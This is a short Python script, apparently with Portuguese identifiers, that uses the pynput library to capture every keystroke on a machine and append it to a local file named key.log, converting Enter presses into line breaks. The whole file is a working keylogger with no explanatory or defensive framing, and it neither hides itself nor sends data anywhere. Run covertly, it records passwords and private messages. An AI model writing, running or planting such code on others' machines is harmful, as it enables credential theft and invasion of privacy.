from pynput.keyboard import Listener
import re

file = 'key.log'

def capturar(tecla):
    tecla = str(tecla)
    tecla += ' '
    tecla = re.sub(r'\'','', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)

    with open(file, 'a') as log:
        log.write(tecla)

with Listener(on_press=capturar) as l:
    l.join()
    

